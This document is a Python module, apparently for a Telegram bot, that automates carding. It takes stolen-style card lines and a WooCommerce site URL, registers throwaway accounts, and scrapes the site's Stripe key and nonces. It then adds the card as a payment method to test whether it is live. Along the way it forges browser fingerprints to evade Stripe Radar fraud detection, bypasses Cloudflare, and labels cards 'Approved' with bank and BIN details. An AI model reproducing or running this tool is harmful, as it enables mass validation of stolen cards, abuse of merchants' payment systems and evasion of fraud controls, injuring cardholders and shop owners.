# ============================================================
#  Auto Stripe Gate — ported from Auto.py
#  WooCommerce Stripe payment method adder with Radar bypass
#  User provides a WooCommerce site URL
# ============================================================

import re
import json
import uuid
import time
import random
import string
import requests
import logging

try:
    import cloudscraper
except ImportError:
    cloudscraper = None

try:
    from bs4 import BeautifulSoup
except ImportError:
    BeautifulSoup = None

logging.basicConfig(level=logging.ERROR)
logger = logging.getLogger(__name__)


# ── Stripe key extraction & validation ──────────────────────

def _extract_stripe_keys(html):
    """Extract Stripe publishable keys from HTML."""
    keys = set()
    for pat in [
        r'["\']publishableKey["\']\s*:\s*["\'](pk_(?:live|test)_[a-zA-Z0-9]+)["\']',
        r'(pk_live_[a-zA-Z0-9]{24,})',
        r'(pk_test_[a-zA-Z0-9]{24,})',
        r'"key"\s*:\s*"(pk_(?:live|test)_[a-zA-Z0-9]+)"',
    ]:
        keys.update(re.findall(pat, html))
    return list(keys)


def _is_valid_key(key):
    if not key:
        return False
    if not (key.startswith('pk_live_') or key.startswith('pk_test_')):
        return False
    if len(key) < 30:
        return False
    return True


# ── Radar bypass fingerprint ────────────────────────────────

def _generate_fingerprint():
    return {
        'muid': str(uuid.uuid4()).replace('-', '') + str(random.randint(1000, 9999)),
        'sid': str(uuid.uuid4()).replace('-', '') + str(random.randint(1000, 9999)),
        'guid': str(uuid.uuid4()),
        'time_on_page': str(random.randint(30000, 180000)),
        'user_agent': random.choice([
            'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        ]),
    }


# ── CAPTCHA detection ───────────────────────────────────────

def _detect_captcha(html):
    html_lower = html.lower()
    if 'recaptcha' in html_lower and 'data-sitekey' in html:
        return 'recaptcha'
    if 'hcaptcha' in html_lower:
        return 'hcaptcha'
    if 'cf-turnstile' in html_lower:
        return 'turnstile'
    return None


# ── BIN lookup ──────────────────────────────────────────────

def _get_bin_info(bin6):
    default = {
        "brand": "UNKNOWN", "type": "UNKNOWN",
        "bank": "UNKNOWN", "country": "UNKNOWN", "emoji": "🏳️",
    }
    try:
        r = requests.get(f"https://api.voidex.dev/api/bin?bin={bin6}", timeout=8)
        if r.status_code == 200:
            d = r.json()
            if d and "brand" in d:
                return {
                    "brand": d.get("brand", "UNKNOWN"),
                    "type": d.get("type", "UNKNOWN"),
                    "bank": d.get("bank", "UNKNOWN"),
                    "country": d.get("country_name", "UNKNOWN"),
                    "emoji": d.get("country_flag", "🏳️"),
                }
    except Exception:
        pass
    return default


# ── Core checker ────────────────────────────────────────────

def _process_card(cc, mm, yy, cvv, site_url, proxy_dict=None):
    """WooCommerce Stripe auto checker. Registers, extracts key, adds payment method."""
    try:
        # Create session (with or without cloudscraper)
        if cloudscraper:
            try:
                test_r = requests.get(site_url, timeout=10)
                if 'cloudflare' in test_r.text.lower() or 'cf-chl' in test_r.text.lower():
                    session = cloudscraper.create_scraper(
                        browser={'browser': 'chrome', 'platform': 'android', 'mobile': True}
                    )
                else:
                    session = requests.Session()
            except Exception:
                session = requests.Session()
        else:
            session = requests.Session()

        fp = _generate_fingerprint()
        ua = fp['user_agent']
        headers = {
            'User-Agent': ua,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
        }

        # Step 1: GET /my-account/ — extract register nonce
        my_account_url = f"{site_url}/my-account/"
        try:
            resp = session.get(my_account_url, headers=headers, proxies=proxy_dict, timeout=15)
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError):
            resp = session.get(my_account_url, headers=headers, timeout=15)

        if resp.status_code != 200:
            return {"status": "Error", "response": f"Site HTTP {resp.status_code}"}

        # Check for captcha
        captcha = _detect_captcha(resp.text)
        if captcha in ('hcaptcha', 'turnstile'):
            return {"status": "Error", "response": f"{captcha.upper()} detected — cannot bypass"}

        # Extract register nonce
        nonce_match = re.search(r'name="woocommerce-register-nonce"\s+value="([^"]+)"', resp.text)
        if not nonce_match:
            return {"status": "Error", "response": "Register nonce not found"}
        reg_nonce = nonce_match.group(1)

        # Step 2: Register throwaway account
        email = ''.join(random.choices(string.ascii_lowercase, k=8)) + "@gmail.com"
        reg_data = {
            'email': email,
            'woocommerce-register-nonce': reg_nonce,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }
        headers_post = headers.copy()
        headers_post.update({'Origin': site_url, 'Referer': my_account_url})

        try:
            resp2 = session.post(my_account_url, headers=headers_post, data=reg_data, proxies=proxy_dict, timeout=15)
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError):
            resp2 = session.post(my_account_url, headers=headers_post, data=reg_data, timeout=15)

        # Step 3: GET add-payment-method page
        apm_url = f"{site_url}/my-account/add-payment-method/"
        try:
            resp3 = session.get(apm_url, headers=headers, proxies=proxy_dict, timeout=15)
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError):
            resp3 = session.get(apm_url, headers=headers, timeout=15)

        # Extract Stripe key
        keys = _extract_stripe_keys(resp3.text)
        if not keys:
            # Try resp2 as fallback
            keys = _extract_stripe_keys(resp2.text)
        pk = None
        for k in keys:
            if _is_valid_key(k):
                pk = k
                break
        if not pk and keys:
            pk = keys[0]
        if not pk:
            return {"status": "Error", "response": "Stripe key not found on site"}

        # Extract account ID
        acct_match = re.search(r'(acct_[a-zA-Z0-9]+)', resp3.text)
        account_id = acct_match.group(1) if acct_match else None

        # Extract setup intent nonce
        nonce_match = None
        for pat in [
            r'"createAndConfirmSetupIntentNonce"\s*:\s*"([^"]+)"',
            r'"createSetupIntentNonce"\s*:\s*"([^"]+)"',
            r'stripe_nonce["\']?\s*[:=]\s*["\']([a-z0-9]+)["\']',
        ]:
            nonce_match = re.search(pat, resp3.text)
            if nonce_match:
                break
        if not nonce_match:
            # Also check resp2
            for pat in [
                r'"createAndConfirmSetupIntentNonce"\s*:\s*"([^"]+)"',
                r'"createSetupIntentNonce"\s*:\s*"([^"]+)"',
            ]:
                nonce_match = re.search(pat, resp2.text)
                if nonce_match:
                    break
        if not nonce_match:
            return {"status": "Error", "response": "Setup nonce not found"}
        setup_nonce = nonce_match.group(1)

        # Step 4: Create payment method on Stripe with Radar bypass
        year_full = f"20{yy}" if len(yy) <= 2 else yy
        name = ''.join(random.choices(string.ascii_letters, k=8))

        payload = (
            f'type=card'
            f'&card[number]={cc}'
            f'&card[cvc]={cvv}'
            f'&card[exp_year]={year_full}'
            f'&card[exp_month]={mm}'
            f'&billing_details[name]={name}'
            f'&billing_details[email]={email}'
            f'&billing_details[address][country]=US'
            f'&billing_details[address][postal_code]=10001'
            f'&allow_redisplay=unspecified'
            f'&key={pk}'
            f'&muid={fp["muid"]}'
            f'&sid={fp["sid"]}'
            f'&guid={fp["guid"]}'
            f'&payment_user_agent=stripe.js%2Fc1fbe29896%3B+stripe-js-v3%2Fc1fbe29896%3B+checkout'
            f'&time_on_page={fp["time_on_page"]}'
        )
        if account_id:
            payload += f'&_stripe_account={account_id}'

        stripe_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': ua,
        }

        stripe_resp = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=stripe_headers, data=payload, timeout=15,
        )

        if stripe_resp.status_code != 200:
            try:
                err_json = stripe_resp.json()
                err_msg = err_json.get('error', {}).get('message', f'HTTP {stripe_resp.status_code}')
            except Exception:
                err_msg = f'HTTP {stripe_resp.status_code}'
            return {"status": "Declined", "response": err_msg[:120]}

        pm_json = stripe_resp.json()
        pm_id = pm_json.get('id')
        if not pm_id:
            return {"status": "Error", "response": "No PM ID returned"}

        # Step 5: Confirm setup intent via WooCommerce AJAX
        ajax_url = f"{site_url}/wp-admin/admin-ajax.php"
        success = False
        result_text = ""

        for action in [
            'wc_stripe_create_and_confirm_setup_intent',
            'create_setup_intent',
            'wc_stripe_create_setup_intent',
        ]:
            ajax_data = {
                'action': action,
                'wc-stripe-payment-method': pm_id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': setup_nonce,
            }
            ajax_headers = {
                'Accept': '*/*',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': site_url,
                'Referer': apm_url,
                'User-Agent': ua,
                'X-Requested-With': 'XMLHttpRequest',
            }
            try:
                ajax_resp = session.post(ajax_url, headers=ajax_headers, data=ajax_data, proxies=proxy_dict, timeout=15)
            except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError):
                ajax_resp = session.post(ajax_url, headers=ajax_headers, data=ajax_data, timeout=15)

            result_text = ajax_resp.text.lower()
            if any(kw in result_text for kw in ['"success":true', 'insufficient_funds', 'payment_method']):
                success = True
                break
            if 'incorrect_cvc' in result_text:
                return {"status": "Approved", "response": "CVC Matched ✅"}

        if success:
            if 'insufficient_funds' in result_text:
                return {"status": "Approved", "response": "Approved (Insufficient Funds) ✅"}
            return {"status": "Approved", "response": "Payment Method Added ✅"}

        # Parse decline reason
        try:
            rj = json.loads(ajax_resp.text) if ajax_resp else {}
            msg = rj.get('data', {}).get('error', {}).get('message', '') or rj.get('message', '')
        except Exception:
            msg = result_text[:80] if result_text else "Setup intent failed"

        return {"status": "Declined", "response": msg[:120]}

    except Exception as e:
        return {"status": "Error", "response": str(e)[:80]}


# ── Public API ──────────────────────────────────────────────

def check_card(cc_line, proxy_dict=None, site_url=None):
    """Entry point for TG bot gate.
    cc_line: "CC|MM|YY|CVV"
    site_url: WooCommerce site URL (required)
    Returns formatted result string.
    """
    if not site_url:
        return "Error | No site URL provided — use /autostripe URL CC|MM|YY|CVV"

    if not site_url.startswith(('http://', 'https://')):
        site_url = 'https://' + site_url
    site_url = site_url.rstrip('/')

    start = time.time()
    parts = cc_line.strip().split('|')
    if len(parts) != 4:
        return "Error | Invalid format (CC|MM|YY|CVV)"

    cc, mm, yy, cvv = [p.strip() for p in parts]
    result = _process_card(cc, mm, yy, cvv, site_url, proxy_dict)
    elapsed = time.time() - start

    status = result.get("status", "Error")
    response = result.get("response", "Unknown")
    bin_info = _get_bin_info(cc[:6])

    if status == "Approved":
        return (
            f"Approved | {response}\n"
            f"Card: {cc}|{mm}|{yy}|{cvv}\n"
            f"Gateway: Auto Stripe (WooCommerce)\n"
            f"Site: {site_url}\n"
            f"BIN: {bin_info['brand']} - {bin_info['type']}\n"
            f"Bank: {bin_info['bank']}\n"
            f"Country: {bin_info['country']} {bin_info['emoji']}\n"
            f"Time: {elapsed:.1f}s"
        )
    elif status == "Declined":
        return (
            f"Declined | {response}\n"
            f"Card: {cc}|{mm}|{yy}|{cvv}\n"
            f"Gateway: Auto Stripe (WooCommerce)\n"
            f"Site: {site_url}\n"
            f"BIN: {bin_info['brand']} - {bin_info['type']}\n"
            f"Time: {elapsed:.1f}s"
        )
    else:
        return f"Error | {response}"


def probe_site(site_url=None):
    """Health check — can we reach a WooCommerce site and see Stripe?"""
    if not site_url:
        return True, "No URL needed — user provides site"
    try:
        r = requests.get(
            f"{site_url}/my-account/",
            headers={"User-Agent": "Mozilla/5.0"},
            timeout=10, allow_redirects=True,
        )
        alive = r.status_code == 200 and ('stripe' in r.text.lower() or 'woocommerce' in r.text.lower())
        return alive, f"HTTP {r.status_code}" + (" | WooCommerce+Stripe found" if alive else " | Not found")
    except Exception as e:
        return False, str(e)[:60]
